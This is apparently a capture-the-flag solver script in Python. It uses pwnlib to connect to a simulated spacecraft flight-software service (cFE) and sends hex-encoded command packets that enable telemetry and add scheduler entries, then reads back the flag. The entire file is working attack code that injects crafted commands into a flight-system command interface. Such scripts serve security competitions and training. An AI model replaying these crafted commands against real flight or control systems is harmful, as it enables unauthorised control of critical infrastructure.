#!/bin/python

import os,sys,time
from binascii import hexlify, unhexlify
from struct import pack, unpack

from pwnlib.tubes.remote import remote
from pwnlib.elf import ELF
 
def sendEnableTlm(sock):
    msg = unhexlify("1880C0000011079A3132372E302E302E3100000000000000")
    sock.send( msg )
    print("Enabled TLM")

def addSchEntry(sock):
    msg = unhexlify("1895C000000D0591040005000100010000002A00")
    sock.send( msg )
    print("Added msg-id \"42\" to slot 4, activity 5")
    sys.stdout.flush()


if __name__ == "__main__":
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31360))
 
    sockChal = remote(Host, Port)
    print("Initiating challenge by connecting to "+ str(Host)+":"+ str(Port))
    sys.stdout.flush()
 
    ticket = os.getenv("TICKET", "")
    if len(ticket):
        sockChal.recvline()
        sockChal.send(ticket + "\n")

    sockChal.recvuntil(b'tcp:', drop=True)
    line = sockChal.recvline().strip()
    print("Connecting to", line)
    sys.stdout.flush()
    
    sockChal.recvuntil(b'CFE_ES_Main entering OPERATIONAL state', drop=True)
    time.sleep(5)
    TlmHost,TlmPort = line.split(b":")
    TlmHost = Host

    print("Connecting to Tlm server at "+str(TlmHost)+":"+str(TlmPort))
    sockTlm  = remote(TlmHost, TlmPort)
 
    sendEnableTlm(sockTlm)
    time.sleep(3)
    addSchEntry(sockTlm)
    time.sleep(3)
    addSchEntry(sockTlm)
    time.sleep(3)
    
    #outs = sockTlm.recv(2000)
    #print(outs)
    
    sockTlm.recvuntil(b"flag{",timeout=10)
    flag = "flag{" + sockTlm.recvuntil("}").decode('utf-8')
    print(flag)
    sys.stdout.flush()
